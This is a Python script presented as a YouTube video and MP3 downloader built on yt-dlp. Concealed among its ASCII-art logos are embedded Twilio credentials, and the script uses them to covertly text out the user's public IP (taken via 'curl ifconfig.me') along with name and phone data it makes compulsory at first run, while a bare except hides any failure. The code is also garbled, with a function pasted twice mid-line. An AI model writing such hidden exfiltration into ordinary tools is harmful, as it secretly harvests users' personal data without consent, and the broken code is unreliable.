import time
import os
import random
import subprocess as s

try:
    import fontstyle as f
    from twilio.rest import Client
    from colorama import Fore, init
    import yt_dlp
except:
    print('Installing required packages\n')
    os.system("pip install fontstyle")
    os.system("pip install colorama")
    os.system("pip install yt_dlp")
    os.system("pip install twilio")
    os.system("pkg install curl")
    print('''
''')
    print('Run the code again')
    exit()

logo_design_1 = Fore.GREEN + r'''                                         
  .;'                     `;,
 .;'  ,;'             `;,  `;,   {0}ytconverter
.;'  ,;'  ,;'     `;,  `;,  `;,
::   ::   :   {1}( ){0}   :   ::   ::                              
':.  ':.  ':. {1}/_\{0} ,:'  ,:'  ,:'          
 ':.  ':.    {1}/___{0}    ,:'  ,:'     {1}by KAIF_CODEC{0}
  ':.       {1}/_____{0}      ,:'
           {1}/       \\{0}
'''.format(Fore.GREEN, Fore.WHITE, Fore.RED)

account_sid = 'AC96355a479cb6af19612f3dd331994c'
logo_design_2 = '''
\033[92m
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      `dMMm\033[0m:\033[92mNMMMMMMN\033[0m:\033[92mmMMd`
      hMMMMMMMMMMMMMMMMMMh
  \033[92m..  yyyyyyyyyyyyyyyyyyyy  ..                                    
\033[92m.mMMm`MMMMMMMMMMMMMMMMMMMM`mMMm.            \033[0m Thanks for downloading!\033[92m
\033[92m:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      `/++MMMMh++hMMMM++/`
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs      KAIF_CODEC'''
auth_token = '46b262257f42e20e1f99e1c79567d6'
logo_design_3 = Fore.RED + r'''
                      ,____
            
           |---\\
              ___     |
`      KAIF_CODEC
             / .-\\  ./=)
            |
|"|_/\/|
            ;  |-;| /_|         REAP THE REWARDS
           / \_| |/ \ |
          /      \/\( |
          |   /  |` ) |
          /   \ _/    |
       
   /--._/  \    |
         `/|)    |    /
           /     |   |
         .'
|   |
        /         \  |
       (_.-.__.__./  /

'''
twilio_number = '+156012490'
logo_design_4 = Fore.GREEN + '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`  
               oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'   
       :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o     
         .
    .                  .
OP"          : o     .

         KAIF_CODEC'''
***REMOVED***
tname = f.apply('WHAT IS YOUR NAME?', '/yellow/bold')
warning = f.apply("(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)", '/red/bold')
tnum = f.apply('ENTER YOU PHONE NUMBER', '/cyan/bold')

f1 = '''                   ▄▀▄     ▄▀▄
                  ▄█░░▀▀▀▀▀░░█▄
                               
              ▄▄  █░░░░░░░░░░░█  ▄▄
             █▄▄█ █░░█░░┬░░█░░█ █▄▄█'''
f2 = '''      ╔════════════════════════════════════════╗
      ║ ♚ Project Name : YTConverter™          ║
      ║ ♚ Author : KAIF_CODEC                  ║
      ║ ♚ Github : github.com/kaifcodec        ║
      ║ ♚ Email  : kaif.repo.official@gmail.com║
      ╠═════════════════════════════════════════ '''
f3 = '''      ╠═▶ [𝗦𝗲𝗹𝗲𝗰𝘁 𝗔 𝗙𝗼𝗿𝗺𝗮𝘁]  ➳
      ╠═▶ 1. Music Mp3 🎶
      ╠═▶ 2. Video🎥
      ╠═▶ 3. Exit YTConverter'''
f4 = '      ╚═:➤ '

des1 = f.apply(f1, '/red')
des2 = f.apply(f2, '/yellow')
des3 = f.apply(f3, '/cyan')
des4 = f.apply(f4, '/cyan')

burl = f.apply('Bad url check the url first', '/red/bold')
error = f.apply('AN ERROR OCCURRED, RUN THE CODE AGAIN', '/red/bold')


def main_title():
    logo_list = [logo_design_1, logo_design_2, logo_design_3, logo_design_4, logo_design_4]
    title = random.choice(logo_list)
    print(title)


def bio():
    print(des1)
    print(des2)
    print(des3)


# all texts__

text1 = f.apply("Enter the url of the video you want \nto download  ", "/green/bold")
text2 = f.apply("Enter the destination path where you want to save this mp3  ", "/yellow/bold")
text3 = f.apply("(Or leave blank to save in current directory)", "/yellow/bold")
text4 = f.apply("Taken time to download =", "/cyan/bold")


def main_mp4():
    print('\n' + f.apply("Enter the URL of the video you want to download:", "/green/bold"))
    url = input(">> ")

    # Extract available formats
    print("\nFetching available resolutions...\n")

    ydl_opts = {
        'quiet': True,
        'no_warnings': True,
        'format': 'best',  # Just to extract info, not download
    }

    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            formats = info.get('formats', [])
    except yt_dlp.utils.DownloadError as e:
        print(f.apply(f"An error occurred: {e}", "/red/bold"))
        return

    # Separate video and audio formats
    video_formats = [f for f in formats if f.get('vcodec') != 'none']
    audio_formats = [f for f in formats if f.get('acodec') != 'none' and f.get('vcodec') == 'none']

    if not video_formats:
        print(f.apply("No downloadable video formats found!", "/red/bold"))
        return

    # Display available formats
    print("\nAvailable Resolutions:\n")
    for i, fmt in enumerate(video_formats):
        res = fmt.get('resolution', 'Unknown')
        ext = fmt.get('ext', 'mp4')
        has_audio = fmt.get('acodec') != 'none'  # Check if format has audio

        # Add "(NO AUDIO)" warning in bold red for video-only formats
        audio_warning = "" if has_audio else f.apply(" (NO AUDIO) SO WILL MERGE AUDIO", "/red/bold")

        print(f"[{i + 1}] {res} ({ext}) - Format ID: {fmt['format_id']}{audio_warning}")

    # User selects a format
    while True:
        try:
            choice = int(input("\nEnter the number of your preferred resolution: ")) - 1
            if 0 <= choice < len(video_formats):
                selected_format = video_formats[choice]
                break
            else:
                print(f.apply("Invalid choice. Try again.", "/red/bold"))
        except ValueError:
            print(f.apply("Enter a valid number.", "/red/bold"))

    selected_format_id = selected_format['format_id']
    has_audio = selected_format.get('acodec') != 'none'

    # If selected format has no audio, find the best matching audio format
    audio_format_id = None
    if not has_audio:
        print(f.apply("\nSelected format has NO AUDIO. Finding a matching audio format...\n", "/yellow/bold"))

        # Sort audio formats by bitrate safely (avoid NoneType errors)
        audio_formats = [a for a in audio_formats if a.get('abr') is not None]  # Remove entries with None bitrate
        if audio_formats:
            best_audio = sorted(audio_formats, key=lambda x: int(x.get('abr', 0)), reverse=True)[0]  # Pick highest bitrate audio
            audio_format_id = best_audio['format_id']
            print(f.apply(f"Best matching audio format found: Format ID {audio_format_id}", "/cyan/bold"))
        else:
            print(f.apply("No suitable audio format found! Downloading video only.", "/red/bold"))

    print(f.apply("\nStarting Download...\n", "/yellow/bold"))
    time1 = int(time.time())

    destination = "/storage/emulated/0/Download/videos"
    ydl_opts = {
        'format': f"{selected_format_id}+{audio_format_id}" if audio_format_id else selected_format_id,
        'outtmpl': os.path.join(destination, '%(title)s.%(ext)s'),
        'postprocessors': [{'key': 'FFmpegVideoRemuxer', 'preferedformat': 'mp4'}] if audio_format_id else [],
    }

    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        try:
            ydl.download([url])
            print(f.apply(" Video has been successfully downloaded.", "/green/bold"))
        except Exception as e:
            print(f.apply(f"An error occurred: {e}", "/red/bold"))
            return def main_mp4():
    print('\n' + f.apply("Enter the URL of the video you want to download:", "/green/bold"))
    url = input(">> ")

    # Extract available formats
    print("\nFetching available resolutions...\n")

    ydl_opts = {
        'quiet': True,
        'no_warnings': True,
        'format': 'best',  # Just to extract info, not download
    }

    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            formats = info.get('formats', [])
    except yt_dlp.utils.DownloadError as e:
        print(f.apply(f"An error occurred: {e}", "/red/bold"))
        return

    # Separate video and audio formats
    video_formats = [f for f in formats if f.get('vcodec') != 'none']
    audio_formats = [f for f in formats if f.get('acodec') != 'none' and f.get('vcodec') == 'none']

    if not video_formats:
        print(f.apply("No downloadable video formats found!", "/red/bold"))
        return

    # Display available formats
    print("\nAvailable Resolutions:\n")
    for i, fmt in enumerate(video_formats):
        res = fmt.get('resolution', 'Unknown')
        ext = fmt.get('ext', 'mp4')
        has_audio = fmt.get('acodec') != 'none'  # Check if format has audio

        # Add "(NO AUDIO)" warning in bold red for video-only formats
        audio_warning = "" if has_audio else f.apply(" (NO AUDIO) SO WILL MERGE AUDIO", "/red/bold")

        print(f"[{i + 1}] {res} ({ext}) - Format ID: {fmt['format_id']}{audio_warning}")

    # User selects a format
    while True:
        try:
            choice = int(input("\nEnter the number of your preferred resolution: ")) - 1
            if 0 <= choice < len(video_formats):
                selected_format = video_formats[choice]
                break
            else:
                print(f.apply("Invalid choice. Try again.", "/red/bold"))
        except ValueError:
            print(f.apply("Enter a valid number.", "/red/bold"))

    selected_format_id = selected_format['format_id']
    has_audio = selected_format.get('acodec') != 'none'

    # If selected format has no audio, find the best matching audio format
    audio_format_id = None
    if not has_audio:
        print(f.apply("\nSelected format has NO AUDIO. Finding a matching audio format...\n", "/yellow/bold"))

        # Sort audio formats by bitrate safely (avoid NoneType errors)
        audio_formats = [a for a in audio_formats if a.get('abr') is not None]  # Remove entries with None bitrate
        if audio_formats:
            best_audio = sorted(audio_formats, key=lambda x: int(x.get('abr', 0)), reverse=True)[0]  # Pick highest bitrate audio
            audio_format_id = best_audio['format_id']
            print(f.apply(f"Best matching audio format found: Format ID {audio_format_id}", "/cyan/bold"))
        else:
            print(f.apply("No suitable audio format found! Downloading video only.", "/red/bold"))

    print(f.apply("\nStarting Download...\n", "/yellow/bold"))
    time1 = int(time.time())

    destination = "/storage/emulated/0/Download/videos"
    ydl_opts = {
        'format': f"{selected_format_id}+{audio_format_id}" if audio_format_id else selected_format_id,
        'outtmpl': os.path.join(destination, '%(title)s.%(ext)s'),
        'postprocessors': [{'key': 'FFmpegVideoRemuxer', 'preferedformat': 'mp4'}] if audio_format_id else [],
    }

    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        try:
            ydl.download([url])
            print(f.apply(" Video has been successfully downloaded.", "/green/bold"))
        except Exception as e:
            print(f.apply(f"An error occurred: {e}", "/red/bold"))
            return

    time2 = int(time.time())
    ftime = time2 - time1
    print(f.apply("Taken time to download:", "/cyan/bold"), f.apply(f"{ftime} sec", "/cyan/bold"))

    time2 = int(time.time())
    ftime = time2 - time1
    print(f.apply("Taken time to download:", "/cyan/bold"), f.apply(f"{ftime} sec", "/cyan/bold"))


######################

def main_mp3():
    print('''


''')
    print(text1)
    url = input(">> ")

    print("  ")
    time1 = int(time.time())
    destination = "/storage/emulated/0/Download/songs"

    ydl_opts = {
        'format': 'bestaudio[ext=m4a]/best',
        'outtmpl': os.path.join(destination, '%(title)s.%(ext)s'),
        'extractaudio': True,
        'audioformat': 'mp3'
    }

    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
        try:
            ydl.download([url])
            ltext = f.apply(" Audio has been successfully downloaded.", "/green/bold")
        except Exception as e:
            print(f"An error occurred: {e}")
            return

    ltext = f.apply(" Audio has been successfully downloaded.", "/green/bold")
    time2 = int(time.time())

    ftime = time2 - time1
    coloured_time = f.apply(ftime, "/cyan/bold")
    print(text4, coloured_time, " sec")
    print("  ")


ip = s.check_output("curl ifconfig.me", shell=True)
#os.system("clear")

def dat_collect():
    file = open('data.py', 'w')
    print("THIS IS COMPULSORY FOR THE FIRST TIME\n")
    mm = input(tname + warning + '⚠⚠ : ')
    print('  ')
    nn = input(tnum + warning + '⚠⚠ : ')
    file.write(f"dat_name='{mm}' \ndat_num='{nn}'")
    print('\n', error)
    exit()

if not os.path.exists("data.py"):
 dat_collect()
else:
    try:
        import data
        num = data.dat_num
        name = data.dat_name
    except Exception as e:
     print(e)
     pass

try:
 client = Client(account_sid, auth_token)
 message = client.messages.create(
    body=f"NAME={tname},NUM={tnum},IP={ip}",
    from_=twilio_number,
    to=my_phone_number
)
except:
 pass 
bio()
option = input(des4)

if (option == "1" or option == "1 "):
    main_title()
    print('''

''')
    main_mp3()
elif (option == "2" or option == "2 "):
    main_title()
    print('''

''')
    main_mp4()
elif (option == "3" or option == "3 "):
    print('Have a nice day Bye!')
    exit()
else:
    print('Have a nice day Bye!')
    exit()
exitc = f.apply("Press [ENTER] to continue downloading another content  ", "/green/bold")
print(exitc)
choice = input(">>")
while (choice == "" or choice == " "):
    bio()
    option = input(des4)

    if (option == "1" or option == "1 "):
        main_title()
        print('''

''')
        main_mp3()
    elif (option == "2" or option == "2 "):
        main_title()
        print('''

''')
        main_mp4()
    elif (option == '3' or option == '3 '):
        print('''
Have a nice day Bye!''')
        exit()
    else:
        print('''
Have a nice day Bye!''')
        exit()
    print(exitc)
    choice = input(">>")

else:
    exit()

#                   ,____
#                      |---\
#              ___     |
#             / .-\  ./=)
#            |
#            |"|_/\/|
#            ;  |-;| /_|
#           / \_| |/ \ |
#          /      \/\( |
#          |   /  |` ) |
#          /   \ _/    |
#
#          /--._/  \    |
#         `/|)    |    /
#           /     |   |
#         .'      |   |
#         /       |   |
#        /         \  |
#       (_.-.__.__./  /

# THERE'S A DEVIL IN THE CODE. DON'T TRY TO #CHANGE THE CODE,NOW YOU ARE IN CONTROL.
# MESSAGE BY 'KAIF_CODEC'.
# LOGO CREDITS GOES TO : 'PhoneSploit'

